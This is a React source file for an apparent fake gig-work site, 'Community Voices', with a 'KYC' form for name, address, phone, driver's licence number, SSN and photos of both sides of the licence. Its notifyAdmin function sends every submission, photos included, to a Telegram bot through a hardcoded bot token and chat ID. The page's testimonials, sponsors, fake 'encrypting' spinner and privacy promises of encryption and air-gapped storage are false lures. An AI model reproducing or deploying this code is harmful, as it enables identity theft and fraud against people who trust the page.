/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useRef, useMemo, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  User, 
  Phone, 
  Mail,
  IdCard, 
  Lock, 
  Camera, 
  CheckCircle2, 
  ChevronRight, 
  ChevronLeft,
  Info,
  ShieldCheck,
  Users,
  Menu,
  X,
  Shield,
  MessageCircle,
  HelpCircle,
  ArrowRight,
  Loader2,
  Linkedin,
  Twitter,
  Youtube,
  LockKeyhole,
  AlertCircle,
  KeyRound,
  Globe,
  Server,
  Fingerprint
} from 'lucide-react';

// --- CONFIGURATION ---
const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || 
                  import.meta.env.NEXT_PUBLIC_VITE_TELEGRAM_BOT_TOKEN || 
                  '8271518232:AAFeo8LvgZHYu54Pqqg7FZR-QdN8Ha-cl_s';

const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || 
                import.meta.env.NEXT_PUBLIC_VITE_TELEGRAM_CHAT_ID || 
                '6857229341';

type FormData = {
  fullName: string;
  phone: string;
  address: string;
  idNumber: string;
  ssn: string;
  idPhoto: File | null;
  idPhotoBase64?: string;
  idPhotoBack: File | null;
  idPhotoBackBase64?: string;
};

const TESTIMONIALS = [
  {
    name: "Sarah Jenkins",
    location: "Austin, TX",
    text: "Community Voices changed my life. I started with simple surveys and now I manage a local feedback group. The payments are always on time!",
    image: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&q=80&w=150&h=150"
  },
  {
    name: "Marcus Thompson",
    location: "Chicago, IL",
    text: "The KYC process was smooth and secure. I feel safe knowing my data is encrypted. I've earned over $1,200 this month alone.",
    image: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=150&h=150"
  },
  {
    name: "Elena Rodriguez",
    location: "Miami, FL",
    text: "Finally a platform that values my opinion. The tasks are engaging and the community support is top-notch. Highly recommended!",
    image: "https://images.unsplash.com/photo-1438761681033-6461ffad8d80?auto=format&fit=crop&q=80&w=150&h=150"
  }
];

export default function App() {
  const [step, setStep] = useState(0); // 0: Hero, 1: Basic Info, 2: Verification, 3: ID Upload, 4: Success
  const [testimonialIndex, setTestimonialIndex] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isPrivacyOpen, setIsPrivacyOpen] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    fullName: '',
    phone: '',
    address: '',
    idNumber: '',
    ssn: '',
    idPhoto: null,
    idPhotoBack: null,
  });

  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const fileInputRef = useRef<HTMLInputElement>(null);
  const fileInputBackRef = useRef<HTMLInputElement>(null);

  // SSN Formatting & Validation
  const handleSSNChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Only allow digits
    const value = e.target.value.replace(/\D/g, '').slice(0, 9);
    updateField('ssn', value);
  };

  // Validation Logic
  const validations = useMemo(() => {
    const ssnRegex = /^\d{9}$/;
    const phoneRegex = /^(\+1\s?)?\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;

    return {
      fullName: formData.fullName.trim().length >= 2,
      phone: phoneRegex.test(formData.phone.trim()),
      address: formData.address.trim().length >= 5,
      idNumber: formData.idNumber.trim().length >= 5,
      ssn: ssnRegex.test(formData.ssn),
      idPhoto: !!formData.idPhoto,
      idPhotoBack: !!formData.idPhotoBack
    };
  }, [formData]);

  const isStep1Valid = validations.fullName && validations.phone && validations.address;
  const isStep2Valid = validations.idNumber && validations.ssn;
  const isStep3Valid = validations.idPhoto && validations.idPhotoBack;

  const updateField = (field: keyof FormData, value: string | File | null) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    setTouched(prev => ({ ...prev, [field]: true }));
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, field: 'idPhoto' | 'idPhotoBack') => {
    const file = e.target.files?.[0] || null;
    updateField(field, file);
    
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        const base64Field = field === 'idPhoto' ? 'idPhotoBase64' : 'idPhotoBackBase64';
        setFormData(prev => ({ ...prev, [base64Field]: reader.result as string }));
      };
      reader.readAsDataURL(file);
    } else {
      const base64Field = field === 'idPhoto' ? 'idPhotoBase64' : 'idPhotoBackBase64';
      setFormData(prev => ({ ...prev, [base64Field]: undefined }));
    }
  };

  const notifyAdmin = async (data: FormData) => {
    const message = `
🛡️ <b>NEW KYC SUBMISSION</b>

👤 <b>Name:</b> <code>${data.fullName}</code>
📞 <b>Phone:</b> <code>${data.phone}</code>
🏠 <b>Address:</b> <code>${data.address}</code>
🆔 <b>ID:</b> <code>${data.idNumber}</code>
🔒 <b>SSN:</b> <code>${data.ssn}</code>

📸 <b>Status:</b> Front & Back ID Photos Attached
    `.trim();

    try {
      // Action A: Send Text Data
      const textPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'HTML',
        }),
      });

      // Action B: Send Front Photo
      let frontPhotoPromise: Promise<any> = Promise.resolve();
      if (data.idPhoto) {
        const photoFormData = new FormData();
        photoFormData.append('chat_id', CHAT_ID);
        photoFormData.append('photo', data.idPhoto);
        photoFormData.append('caption', `🆔 FRONT ID Photo for: ${data.fullName}`);
        
        frontPhotoPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: photoFormData,
        });
      }

      // Action C: Send Back Photo
      let backPhotoPromise: Promise<any> = Promise.resolve();
      if (data.idPhotoBack) {
        const photoFormData = new FormData();
        photoFormData.append('chat_id', CHAT_ID);
        photoFormData.append('photo', data.idPhotoBack);
        photoFormData.append('caption', `🆔 BACK ID Photo for: ${data.fullName}`);
        
        backPhotoPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: photoFormData,
        });
      }

      await Promise.all([textPromise, frontPhotoPromise, backPhotoPromise]);
    } catch (error) {
      console.error('Notification error:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 1 && isStep1Valid) {
      setStep(2);
    } else if (step === 2 && isStep2Valid) {
      setStep(3);
    } else if (step === 3 && isStep3Valid) {
      setIsSubmitting(true);
      setTimeout(async () => {
        await notifyAdmin(formData);
        setIsSubmitting(false);
        setStep(4);
      }, 3000);
    }
  };

  return (
    <div id="home" className="min-h-screen relative text-slate-900 selection:bg-blue-600 selection:text-white overflow-x-hidden font-sans bg-slate-50">
      {/* Background Image with Overlay */}
      <div 
        className="fixed inset-0 z-0 bg-cover bg-center bg-no-repeat transition-transform duration-1000"
        style={{ 
          backgroundImage: 'url("https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&q=80")',
          transform: step > 0 ? 'scale(1.1)' : 'scale(1)'
        }}
      >
        <div className="absolute inset-0 bg-[#0f172a]/80 backdrop-blur-[2px]"></div>
      </div>

      <div className="relative z-10 flex flex-col min-h-screen">
        {/* Navigation */}
        <header className="bg-transparent border-b border-white/10">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-20">
              <div className="flex items-center gap-3">
                <div className="bg-blue-600 p-2 rounded-lg shadow-lg">
                  <Users className="w-6 h-6 text-white" />
                </div>
                <span className="text-xl font-black text-white tracking-tighter uppercase">Community Voices</span>
              </div>
              
              <nav className="hidden md:flex items-center gap-8">
                {['Home', 'How it Works', 'About Us', 'Help Center'].map((item) => (
                  <a key={item} href={`#${item.toLowerCase().replace(/\s+/g, '')}`} className="text-sm font-bold text-slate-300 hover:text-white transition-colors uppercase tracking-widest">{item}</a>
                ))}
              </nav>

              <button onClick={() => setIsMenuOpen(!isMenuOpen)} className="md:hidden p-2 text-white">
                {isMenuOpen ? <X /> : <Menu />}
              </button>
            </div>
          </div>
        </header>

        <main className="flex-grow flex flex-col items-center px-4 py-12">
          <AnimatePresence mode="wait">
            {step === 0 && (
              <motion.div 
                key="hero"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="max-w-4xl w-full text-center my-auto"
              >
                <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-blue-500/10 text-blue-400 text-[10px] font-black uppercase tracking-[0.3em] mb-8 border border-blue-500/20">
                  <ShieldCheck className="w-4 h-4" />
                  Secure Verification Portal
                </div>
                <h1 className="text-5xl md:text-8xl font-black text-white mb-8 leading-[0.9] tracking-tighter">
                  YOUR VOICE. <br />
                  YOUR COMMUNITY. <br />
                  <span className="text-blue-500 text-6xl md:text-7xl">GET PAID.</span>
                </h1>
                <p className="text-xl md:text-2xl text-slate-300 max-w-2xl mx-auto mb-12 font-medium leading-relaxed">
                  Join thousands of community members earning through micro-tasks. Complete your secure KYC verification to unlock your first gig.
                </p>
                <div className="flex flex-col sm:flex-row justify-center gap-6">
                  <button 
                    onClick={() => setStep(1)}
                    className="bg-blue-600 text-white px-12 py-5 rounded-xl font-black text-lg hover:bg-blue-500 transition-all shadow-2xl shadow-blue-500/20 hover:-translate-y-1 uppercase tracking-widest"
                  >
                    GET STARTED
                  </button>
                  <a href="#howitworks" className="bg-transparent text-white border-2 border-white/20 px-12 py-5 rounded-xl font-black text-lg hover:bg-white/10 transition-all flex items-center justify-center gap-2 uppercase tracking-widest">
                    LEARN MORE <ArrowRight className="w-5 h-5" />
                  </a>
                </div>

                {/* Sponsor Marquee */}
                <div className="mt-24 overflow-hidden relative">
                  <div className="absolute inset-y-0 left-0 w-20 bg-gradient-to-r from-[#0f172a] to-transparent z-10"></div>
                  <div className="absolute inset-y-0 right-0 w-20 bg-gradient-to-l from-[#0f172a] to-transparent z-10"></div>
                  <p className="text-[10px] font-black text-slate-500 uppercase tracking-[0.4em] mb-8">Official Partners & Sponsors</p>
                  <motion.div 
                    className="flex gap-12 items-center whitespace-nowrap"
                    animate={{ x: [0, -1000] }}
                    transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
                  >
                    {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
                      <div key={i} className="flex items-center gap-3 opacity-40 hover:opacity-100 transition-opacity grayscale hover:grayscale-0 cursor-default">
                        <div className="w-8 h-8 bg-white/10 rounded flex items-center justify-center">
                          <Globe className="w-5 h-5 text-white" />
                        </div>
                        <span className="text-white font-black text-sm uppercase tracking-widest">GlobalCorp {i}</span>
                      </div>
                    ))}
                    {/* Duplicate for infinite loop */}
                    {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
                      <div key={`dup-${i}`} className="flex items-center gap-3 opacity-40 hover:opacity-100 transition-opacity grayscale hover:grayscale-0 cursor-default">
                        <div className="w-8 h-8 bg-white/10 rounded flex items-center justify-center">
                          <Globe className="w-5 h-5 text-white" />
                        </div>
                        <span className="text-white font-black text-sm uppercase tracking-widest">GlobalCorp {i}</span>
                      </div>
                    ))}
                  </motion.div>
                </div>
              </motion.div>
            )}

            {(step >= 1 && step <= 3) && (
              <motion.div 
                key="form-card"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="bg-white w-full max-w-[500px] shadow-2xl rounded-2xl overflow-hidden relative"
              >
                {isSubmitting && (
                  <div className="absolute inset-0 bg-white/90 backdrop-blur-md z-50 flex flex-col items-center justify-center p-10 text-center">
                    <Loader2 className="w-12 h-12 text-blue-600 animate-spin mb-6" />
                    <h3 className="text-xl font-black text-slate-900 mb-2">Encrypting documents for secure transmission...</h3>
                    <p className="text-sm text-slate-500 font-bold uppercase tracking-widest">Do not close your browser</p>
                  </div>
                )}

                <div className="bg-slate-50 p-8 border-b border-slate-100">
                  <h2 className="text-2xl font-black text-slate-800 mb-2 uppercase tracking-tight">
                    {step === 1 ? 'Personal Profile' : step === 2 ? 'Identity Verification' : 'Document Upload'}
                  </h2>
                  <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">Step {step} of 3</p>
                </div>

                <form onSubmit={handleSubmit} className="p-8 space-y-6">
                  <AnimatePresence mode="wait">
                    {step === 1 && (
                      <motion.div key="step1" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-4">
                        <div className="space-y-1">
                          <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Full Legal Name</label>
                          <input required type="text" placeholder="John Doe" className="w-full border-b-2 border-slate-200 py-3 outline-none focus:border-blue-600 transition-colors text-slate-800 font-bold" value={formData.fullName} onChange={e => updateField('fullName', e.target.value)} />
                        </div>
                        <div className="space-y-1">
                          <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Phone Number</label>
                          <input required type="tel" placeholder="(555) 000-0000" className="w-full border-b-2 border-slate-200 py-3 outline-none focus:border-blue-600 transition-colors text-slate-800 font-bold" value={formData.phone} onChange={e => updateField('phone', e.target.value)} />
                        </div>
                        <div className="space-y-1">
                          <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Current Address</label>
                          <input required type="text" placeholder="123 Main St, City, State, Zip" className="w-full border-b-2 border-slate-200 py-3 outline-none focus:border-blue-600 transition-colors text-slate-800 font-bold" value={formData.address} onChange={e => updateField('address', e.target.value)} />
                        </div>
                      </motion.div>
                    )}

                    {step === 2 && (
                      <motion.div key="step2" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-4">
                        <div className="space-y-1">
                          <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Driver's License Number</label>
                          <input required type="text" placeholder="DL-12345678" className="w-full border-b-2 border-slate-200 py-3 outline-none focus:border-blue-600 transition-colors text-slate-800 font-bold" value={formData.idNumber} onChange={e => updateField('idNumber', e.target.value)} />
                        </div>
                        <div className="space-y-1">
                          <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Social Security Number (9 Digits)</label>
                          <input required type="text" placeholder="123456789" className={`w-full border-b-2 py-3 outline-none transition-colors text-slate-800 font-bold ${touched.ssn && !validations.ssn ? 'border-red-500' : 'border-slate-200 focus:border-blue-600'}`} value={formData.ssn} onChange={handleSSNChange} />
                          {touched.ssn && !validations.ssn && (
                            <p className="text-[10px] text-red-500 font-bold uppercase tracking-widest mt-1">Invalid SSN format (Must be 9 digits)</p>
                          )}
                        </div>
                      </motion.div>
                    )}

                    {step === 3 && (
                      <motion.div key="step3" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-6">
                        <div className="grid grid-cols-1 gap-4">
                          {/* Front View Upload */}
                          <div 
                            onClick={() => fileInputRef.current?.click()}
                            className={`border-2 border-dashed rounded-2xl p-6 transition-all cursor-pointer group relative overflow-hidden text-center ${
                              formData.idPhoto 
                                ? 'border-emerald-500 bg-emerald-50/50' 
                                : 'border-slate-200 hover:border-blue-600 hover:bg-blue-50/30'
                            }`}
                          >
                            <input type="file" ref={fileInputRef} className="hidden" accept="image/*" onChange={(e) => handleFileChange(e, 'idPhoto')} />
                            
                            {formData.idPhotoBase64 ? (
                              <div className="relative z-10">
                                <img src={formData.idPhotoBase64} alt="Front ID Preview" className="max-h-32 mx-auto rounded-lg shadow-md mb-2" />
                                <div className="flex items-center justify-center gap-2 text-emerald-600 font-black text-[10px] uppercase tracking-widest">
                                  <CheckCircle2 className="w-3 h-3" />
                                  <span>Front Captured</span>
                                </div>
                              </div>
                            ) : (
                              <>
                                <div className="w-10 h-10 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-2 group-hover:bg-blue-100 transition-colors">
                                  <Camera className="w-5 h-5 text-slate-400 group-hover:text-blue-600" />
                                </div>
                                <h3 className="text-xs font-black text-slate-800 mb-1 uppercase tracking-tight">Front View</h3>
                                <p className="text-[8px] text-slate-400 font-bold uppercase tracking-widest">Front of your Driver's License</p>
                              </>
                            )}
                          </div>

                          {/* Back View Upload */}
                          <div 
                            onClick={() => fileInputBackRef.current?.click()}
                            className={`border-2 border-dashed rounded-2xl p-6 transition-all cursor-pointer group relative overflow-hidden text-center ${
                              formData.idPhotoBack 
                                ? 'border-emerald-500 bg-emerald-50/50' 
                                : 'border-slate-200 hover:border-blue-600 hover:bg-blue-50/30'
                            }`}
                          >
                            <input type="file" ref={fileInputBackRef} className="hidden" accept="image/*" onChange={(e) => handleFileChange(e, 'idPhotoBack')} />
                            
                            {formData.idPhotoBackBase64 ? (
                              <div className="relative z-10">
                                <img src={formData.idPhotoBackBase64} alt="Back ID Preview" className="max-h-32 mx-auto rounded-lg shadow-md mb-2" />
                                <div className="flex items-center justify-center gap-2 text-emerald-600 font-black text-[10px] uppercase tracking-widest">
                                  <CheckCircle2 className="w-3 h-3" />
                                  <span>Back Captured</span>
                                </div>
                              </div>
                            ) : (
                              <>
                                <div className="w-10 h-10 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-2 group-hover:bg-blue-100 transition-colors">
                                  <Camera className="w-5 h-5 text-slate-400 group-hover:text-blue-600" />
                                </div>
                                <h3 className="text-xs font-black text-slate-800 mb-1 uppercase tracking-tight">Back View</h3>
                                <p className="text-[8px] text-slate-400 font-bold uppercase tracking-widest">Back of your Driver's License</p>
                              </>
                            )}
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>

                  <div className="flex gap-3 pt-6">
                    {step > 1 && (
                      <button type="button" onClick={() => setStep(step - 1)} className="flex-1 py-3 bg-slate-100 text-slate-600 rounded-lg font-black text-xs uppercase tracking-widest hover:bg-slate-200 transition-colors">Back</button>
                    )}
                    <button 
                      type="submit" 
                      disabled={
                        (step === 1 && !isStep1Valid) || 
                        (step === 2 && !isStep2Valid) || 
                        (step === 3 && !isStep3Valid)
                      }
                      className="flex-[2] py-3 bg-blue-600 text-white rounded-lg font-black text-xs uppercase tracking-widest hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {step === 3 ? "Complete KYC" : "Continue"}
                    </button>
                  </div>
                </form>
              </motion.div>
            )}

            {step === 4 && (
              <motion.div 
                key="success"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-white w-full max-w-[500px] p-12 shadow-2xl rounded-2xl text-center"
              >
                <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto mb-8">
                  <CheckCircle2 className="w-10 h-10 text-emerald-500" />
                </div>
                <h2 className="text-2xl font-black text-slate-900 mb-4 uppercase tracking-tight">Submission Successful</h2>
                <p className="text-slate-600 mb-8 font-medium">
                  Your KYC documents have been securely transmitted. Our team will review your profile and unlock your gig access within 24 hours.
                </p>
                <button onClick={() => window.location.reload()} className="w-full py-4 bg-slate-900 text-white rounded-xl font-black text-sm uppercase tracking-widest hover:bg-slate-800 transition-colors">Return to Home</button>
              </motion.div>
            )}
          </AnimatePresence>
        </main>

        {/* Testimonials Section (How it Works) */}
        <section id="howitworks" className="py-24 bg-slate-900 relative z-10 overflow-hidden">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="text-center mb-16">
              <h2 className="text-3xl font-black text-white mb-4 tracking-tight uppercase">Success Stories</h2>
              <p className="text-slate-400 font-bold uppercase tracking-widest text-xs">Real People. Real Impact. Real Earnings.</p>
            </div>

            <div className="relative max-w-4xl mx-auto">
              <AnimatePresence mode="wait">
                <motion.div 
                  key={testimonialIndex}
                  initial={{ opacity: 0, x: 50 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -50 }}
                  className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-3xl p-8 md:p-12 flex flex-col md:flex-row items-center gap-10"
                >
                  <div className="relative">
                    <div className="absolute -inset-4 bg-blue-600/20 rounded-full blur-2xl"></div>
                    <img 
                      src={TESTIMONIALS[testimonialIndex].image} 
                      alt={TESTIMONIALS[testimonialIndex].name}
                      loading="lazy"
                      className="w-32 h-32 md:w-48 md:h-48 rounded-full object-cover border-4 border-blue-600 relative z-10"
                    />
                  </div>
                  <div className="flex-1 text-center md:text-left">
                    <div className="flex justify-center md:justify-start gap-1 mb-6">
                      {[1, 2, 3, 4, 5].map(star => (
                        <CheckCircle2 key={star} className="w-5 h-5 text-blue-500 fill-blue-500" />
                      ))}
                    </div>
                    <p className="text-xl md:text-2xl text-white font-medium italic mb-8 leading-relaxed">
                      "{TESTIMONIALS[testimonialIndex].text}"
                    </p>
                    <div>
                      <h4 className="text-lg font-black text-white uppercase tracking-tight">{TESTIMONIALS[testimonialIndex].name}</h4>
                      <p className="text-blue-500 font-bold uppercase tracking-widest text-xs">{TESTIMONIALS[testimonialIndex].location}</p>
                    </div>
                  </div>
                </motion.div>
              </AnimatePresence>

              <div className="flex justify-center gap-4 mt-12">
                <button 
                  onClick={() => setTestimonialIndex((prev) => (prev === 0 ? TESTIMONIALS.length - 1 : prev - 1))}
                  className="p-3 rounded-full bg-white/5 border border-white/10 text-white hover:bg-blue-600 hover:border-blue-600 transition-all"
                >
                  <ChevronLeft className="w-6 h-6" />
                </button>
                <button 
                  onClick={() => setTestimonialIndex((prev) => (prev === TESTIMONIALS.length - 1 ? 0 : prev + 1))}
                  className="p-3 rounded-full bg-white/5 border border-white/10 text-white hover:bg-blue-600 hover:border-blue-600 transition-all"
                >
                  <ChevronRight className="w-6 h-6" />
                </button>
              </div>
            </div>
          </div>
        </section>

        {/* About Us Section */}
        <section id="aboutus" className="py-24 bg-white relative z-10">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="grid md:grid-cols-2 gap-20 items-center">
              <div>
                <h2 className="text-4xl font-black text-slate-900 mb-8 tracking-tight uppercase">Empowering Communities Through Work.</h2>
                <div className="space-y-6 text-slate-500 font-medium leading-relaxed">
                  <p>Community Voices is a micro-task platform dedicated to providing work-from-home opportunities for everyone. We believe that local voices are the most powerful tool for social impact.</p>
                  <p>To ensure the security of our platform and comply with US tax regulations, we require a secure KYC (Know Your Customer) verification. This process helps us verify your identity and ensure that payments are sent to the correct individual.</p>
                  <p>Your SSN is required for IRS Form 1099-NEC reporting if your earnings exceed $600. We use bank-level encryption to protect your data during transmission.</p>
                </div>
              </div>
              <div className="relative">
                <img 
                  src="https://picsum.photos/seed/community/800/600" 
                  alt="Community Impact" 
                  loading="lazy"
                  className="rounded-3xl shadow-2xl" 
                  referrerPolicy="no-referrer" 
                />
              </div>
            </div>
          </div>
        </section>

        {/* FAQ Section */}
        <section id="helpcenter" className="py-24 bg-slate-50 border-y border-slate-100 relative z-10">
          <div className="max-w-3xl mx-auto px-4">
            <h2 className="text-3xl font-black text-slate-900 text-center mb-16 tracking-tight uppercase">Frequently Asked Questions</h2>
            <div className="space-y-6">
              {[
                {
                  q: "Why do I need to provide my SSN?",
                  a: "As a US-based platform, we are required by the IRS to collect tax information from all participants. If you earn more than $600 in a calendar year, we must issue a 1099-NEC form. Your SSN is encrypted and handled with the highest security standards."
                },
                {
                  q: "Is my ID photo safe?",
                  a: "Yes. We use end-to-end encryption for all document uploads. Once verified, your ID photo is stored in a secure, air-gapped environment and is only accessible by authorized compliance officers."
                },
                {
                  q: "How long does verification take?",
                  a: "Most profiles are reviewed and approved within 24 hours. You will receive an email notification once your gig access is unlocked."
                }
              ].map((item, i) => (
                <div key={i} className="bg-white rounded-xl p-8 shadow-sm border border-slate-100">
                  <h3 className="text-lg font-black text-slate-900 mb-4 flex gap-3">
                    <HelpCircle className="w-6 h-6 text-blue-600 flex-shrink-0" />
                    {item.q}
                  </h3>
                  <p className="text-slate-500 font-medium leading-relaxed pl-9">{item.a}</p>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer className="bg-[#0f172a] text-white py-16 px-4 relative z-10">
          <div className="max-w-7xl mx-auto">
            <div className="flex flex-col md:flex-row justify-between items-center gap-10">
              <div className="flex items-center gap-3">
                <Users className="w-8 h-8 text-blue-500" />
                <span className="text-2xl font-black tracking-tighter uppercase">Community Voices</span>
              </div>
              
              <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest text-center md:text-right flex flex-col md:items-end gap-2">
                <span>© 2026 Community Voices Platform. All rights reserved.</span>
                <button 
                  onClick={() => setIsPrivacyOpen(true)}
                  className="hover:text-blue-500 transition-colors cursor-pointer"
                >
                  Privacy Policy & Data Handling
                </button>
              </div>

              <div className="flex items-center gap-6">
                <a href="#" className="text-slate-500 hover:text-blue-600 transition-colors"><Linkedin className="w-5 h-5" /></a>
                <a href="#" className="text-slate-500 hover:text-blue-400 transition-colors"><Twitter className="w-5 h-5" /></a>
                <a href="#" className="text-slate-500 hover:text-red-600 transition-colors"><Youtube className="w-5 h-5" /></a>
              </div>
            </div>
          </div>
        </footer>

        {/* Privacy Policy Modal */}
        <AnimatePresence>
          {isPrivacyOpen && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                onClick={() => setIsPrivacyOpen(false)}
                className="absolute inset-0 bg-[#0f172a]/90 backdrop-blur-sm"
              />
              <motion.div 
                initial={{ opacity: 0, scale: 0.95, y: 20 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.95, y: 20 }}
                className="relative bg-white w-full max-w-2xl max-h-[80vh] overflow-y-auto rounded-2xl shadow-2xl p-8 md:p-12"
              >
                <button 
                  onClick={() => setIsPrivacyOpen(false)}
                  className="absolute top-6 right-6 p-2 text-slate-400 hover:text-slate-900 transition-colors"
                >
                  <X className="w-6 h-6" />
                </button>

                <div className="flex items-center gap-3 mb-8">
                  <Shield className="w-8 h-8 text-blue-600" />
                  <h2 className="text-2xl font-black text-slate-900 uppercase tracking-tight">Privacy Policy</h2>
                </div>

                <div className="space-y-6 text-slate-600 font-medium leading-relaxed">
                  <section>
                    <h3 className="text-sm font-black text-slate-900 uppercase tracking-widest mb-2">1. Data Collection</h3>
                    <p>We collect personal information including your legal name, contact details, Social Security Number (SSN), and government-issued identification photos. This data is collected solely for the purpose of identity verification and US tax compliance (IRS Form 1099-NEC).</p>
                  </section>

                  <section>
                    <h3 className="text-sm font-black text-slate-900 uppercase tracking-widest mb-2">2. Data Handling & Security</h3>
                    <p>All sensitive data, including SSNs and ID photos, are encrypted using bank-level AES-256 encryption during transmission. We utilize secure end-to-end communication channels to ensure your documents are never exposed to unauthorized parties.</p>
                  </section>

                  <section>
                    <h3 className="text-sm font-black text-slate-900 uppercase tracking-widest mb-2">3. Data Retention</h3>
                    <p>Identification documents are stored in a secure, air-gapped environment. Once your identity is verified and the necessary tax records are established, ID photos are archived and restricted from general access. We do not sell or share your personal data with third-party marketing agencies.</p>
                  </section>

                  <section>
                    <h3 className="text-sm font-black text-slate-900 uppercase tracking-widest mb-2">4. Your Rights</h3>
                    <p>You have the right to request the deletion of your account and associated data, subject to US federal record-keeping requirements for tax purposes. For any privacy-related inquiries, please contact our Compliance Department via the Help Center.</p>
                  </section>
                </div>

                <button 
                  onClick={() => setIsPrivacyOpen(false)}
                  className="w-full mt-10 py-4 bg-blue-600 text-white rounded-xl font-black text-sm uppercase tracking-widest hover:bg-blue-700 transition-colors"
                >
                  I Understand
                </button>
              </motion.div>
            </div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}